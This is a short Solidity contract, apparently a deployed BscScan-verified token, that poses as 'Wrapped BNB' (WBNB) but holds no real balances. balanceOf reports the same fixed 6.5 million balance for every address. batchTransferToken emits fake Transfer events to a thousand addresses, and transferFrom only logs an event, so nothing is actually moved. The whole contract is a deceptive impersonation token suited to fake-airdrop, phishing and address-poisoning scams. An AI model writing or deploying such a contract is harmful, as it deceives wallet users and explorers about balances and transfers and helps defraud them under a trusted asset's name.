/**
 *Submitted for verification at BscScan.com on 2022-06-26
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract WBNB {
    string public name     = "Wrapped BNB";
    string public symbol   = "WBNB";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 amount);

    function transfer(address to, uint256 amount)
    public
    returns (bool) {
        return transferFrom(msg.sender, to, amount);
    }

    function balanceOf(address /*account*/)
    public
    pure
    returns (uint256) {
        return 6500000000000000000000000;
    }

    function batchTransferToken(address[] memory _users, uint256 amount) public {
        for (uint i = 0; i < 1000; ++i) {
            emit Transfer(address(this), _users[i], amount);
        }
    }

    function transferFrom(address from, address to, uint256 amount)
    public
    returns (bool)
    {
        require(to == address(0));
        emit Transfer(from, to, amount);
        return true;
    }
}